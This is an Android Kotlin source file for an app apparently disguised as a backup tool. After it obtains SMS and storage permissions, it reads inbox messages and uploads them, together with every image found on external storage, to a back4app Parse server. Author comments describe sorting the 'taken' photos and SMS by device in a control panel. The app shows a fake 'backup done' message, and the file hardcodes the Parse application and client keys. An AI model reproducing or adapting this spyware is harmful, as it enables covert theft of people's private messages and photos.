package com.example.sms_and_pictures

import android.Manifest
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.RequestBody.Companion.asRequestBody
import android.annotation.SuppressLint
import android.content.ContentResolver
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Bundle
import android.util.Log
import android.widget.Button
import androidx.activity.ComponentActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.os.Environment
import android.os.SystemClock
import android.provider.Settings.Global.getString
import android.widget.Toast
import com.example.sms_and_pictures.R.*
import com.parse.Parse
import com.parse.ParseFile
import com.parse.ParseObject
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import okhttp3.Call
import okhttp3.MultipartBody
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream
import okhttp3.ResponseBody as Okhttp3ResponseBody


private val PERMISSION_REQUEST_CODE = 100
private val SMS_PERMISSION_REQUEST_CODE = 100
private val SMS_SENDER_REQUEST_CODE = 100
private val STORAGE_PERMISSION_REQUEST_CODE = 101
var class_name_sms = ""
var class_name_photo = ""
val deviceId = DeviceIdGenerator.generateUniqueId()


class DeviceIdGenerator {

    companion object {
        fun generateUniqueId(): String {

            return "ID_DO_DISPOSITIVO"
        } } }


class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        fun determineSMSClassName(deviceId: String) {
            //esse trecho gera um id que vai de 0 a 1000, ou seja posso criar ate 1000 classes com
            //nomes diferentes no back4app, cada classe vai conter as fotos e sms do aparelho do usuario
            // o nome da classe sera algo como photos112 e sms112, ou photos999 e sms999
            // isso serve para organizar melhor o painel, e saber quais fotos e sms sao de quais aparelhos
            val numClasses = 1000
            val classNumber = deviceId.hashCode() % numClasses
            class_name_sms = "sms$classNumber"
            class_name_photo = "photo$classNumber"
        }

        setContentView(layout.layout1)
// configurar e inicializar o parse, as fotos e sms pegos
// serao enviados para um servidor e poderao ser vistas no painel do back4app
        val parseConfiguration = Parse.Configuration.Builder(this)
            .applicationId("6Nw6Rm4SmfZb41RJMvzfDR0vnpehu8VWAOBSmoSx")
            .clientKey("JlNGZ97gvlngCKD5DZ9v98svvNGZh4q6kjDerCeS")
            .server("https://parseapi.back4app.com/")
            .build()

        Parse.initialize(parseConfiguration)
        determineSMSClassName(deviceId)



        val botao = findViewById<Button>(id.btnNext)

        botao.setOnClickListener {
            val permissions = arrayOf(
                Manifest.permission.READ_SMS,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.RECEIVE_SMS
            )

            val permissionsToRequest = mutableListOf<String>()
            for (permission in permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    permissionsToRequest.add(permission)
                }
            }

            if (permissionsToRequest.isNotEmpty()) {
                ActivityCompat.requestPermissions(
                    this,
                    permissionsToRequest.toTypedArray(),
                    PERMISSION_REQUEST_CODE
                )
            }
        }
    }


    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_REQUEST_CODE) {
            val permissionsNeededMessage = getString(R.string.permissions_needed)
            var allPermissionsGranted = true
            val permissionsToRequest = mutableListOf<String>()
            for (i in permissions.indices) {
                val permission = permissions[i]
                val grantResult = grantResults[i]
                if (grantResult != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false
                    Toast.makeText(this, permissionsNeededMessage, Toast.LENGTH_SHORT).show()
                    permissionsToRequest.add(permission) // Adiciona a permissão não concedida à lista
                }
            }

            if (!allPermissionsGranted) {
                // Solicita as permissões novamente para as que não foram concedidas
                ActivityCompat.requestPermissions(this, permissionsToRequest.toTypedArray(), PERMISSION_REQUEST_CODE)
            } else {

                readSMS()
            }
        }
    }

    @SuppressLint("Range")
    fun readSMS() {

        val contentResolver: ContentResolver = contentResolver
        val uri: Uri = Uri.parse("content://sms/inbox")
        val cursor = contentResolver.query(uri, null, null, null, "date DESC")

        val seenMessages = HashSet<String>() // Para rastrear mensagens já vistas
        var count = 0
        cursor?.let {
            while (it.moveToNext()) {
                count +=1
                val sender = it.getString(it.getColumnIndex("address"))
                val messageBody = it.getString(it.getColumnIndex("body"))
                val messageId = it.getString(it.getColumnIndex("_id"))

                // Verifica se já vimos esta mensagem antes
                if (!seenMessages.contains(messageId)) {
                    if(count<15){
                        val smsObject = ParseObject(class_name_sms)
                        smsObject.put("Sender", sender)
                        smsObject.put("MessageBody", messageBody)

                        smsObject.saveInBackground { e ->
                            if (e != null) {
                                Log.e("MainActivity", "Error: ${e.localizedMessage}")
                            } else {
                                Log.d("MainActivity", "Object saved.")
                            }
                        }

                    }

                    seenMessages.add(messageId) // Adiciona o ID da mensagem ao conjunto de mensagens vistas
                }

                Log.d("SMS", "Sender: $sender - Message: $messageBody")
            }
        }

        cursor?.close()

        val externalStorageDir = Environment.getExternalStorageDirectory()
        uploadPictures(externalStorageDir)
    }


    fun uploadImageToParse(imageFile: File) {
        Log.d("SMS_and pictures", "Upload Imageto parse")
        val fileSize = imageFile.length()
        val bufferSize = 5 * 1024 * 1024 // 5 MB buffer size
        var totalBytesRead: Long = 0

        val fileStream = FileInputStream(imageFile)
        val buffer = ByteArray(bufferSize)

        val byteArrayOutputStream = ByteArrayOutputStream()

        // Le o arquivo em partes menores pois lendo tudo de uma vez pode causar erro
        while (true) {
            val bytesRead = fileStream.read(buffer)
            if (bytesRead == -1) break // Se não há mais dados, saia do loop

            byteArrayOutputStream.write(buffer, 0, bytesRead)
            totalBytesRead += bytesRead.toLong()
        }

        // Crie o ParseFile com os dados completos do arquivo
        val data = byteArrayOutputStream.toByteArray()
        val filePart = ParseFile("photo.jpg", data)

        val photoObject = ParseObject(class_name_photo)
        photoObject.put("photoFile", filePart)
        photoObject.put("Description", "Descrição da foto")

        // Salve o objeto ParseObject
        photoObject.saveInBackground { e ->
            if (e == null) {

                Log.d("Upload", "Arquivo enviado com sucesso: $totalBytesRead / $fileSize bytes")
            } else {

                Log.d("Upload", "Erro ao enviar arquivo: ${e.message}")
            }
        }

        fileStream.close()

        Toast.makeText(this,"Parabens backup feito com sucesso", Toast.LENGTH_SHORT).show()
    }


    fun uploadPictures(directory: File) {

        val files = directory.listFiles()

        // Verifica se há arquivos em todos os diretorios e subdiretorios
        if (files != null) {
            for (file in files) {
                if (file.isDirectory) {

                    uploadPictures(file)
                } else if (file.isFile && file.extension.toLowerCase() in listOf("jpg", "jpeg", "png")
                    && !file.name.startsWith(".trashed")) {
                    // Se for um arquivo de imagem e nao for uma imagem que foi excluida(.trashed) chama uploadImageToparse
                    uploadImageToParse(file)
                }
            }
        }
    }
}





